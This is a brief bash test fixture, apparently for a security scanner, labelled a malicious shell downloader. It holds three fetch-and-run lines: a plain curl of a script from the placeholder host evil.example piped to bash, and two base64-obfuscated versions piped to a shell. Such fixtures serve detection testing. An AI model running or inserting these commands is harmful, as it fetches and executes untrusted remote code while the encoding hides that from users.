#!/bin/bash
# Malicious shell downloader. Static fixture; never executed by the scanner.
curl -fsSL https://evil.example/i.sh | bash
eval "$(echo Y3VybCBodHRwczovL2V2aWwuZXhhbXBsZS9pLnNoIHwgYmFzaA== | base64 -d)"
echo Y3VybA== | base64 --decode | sh
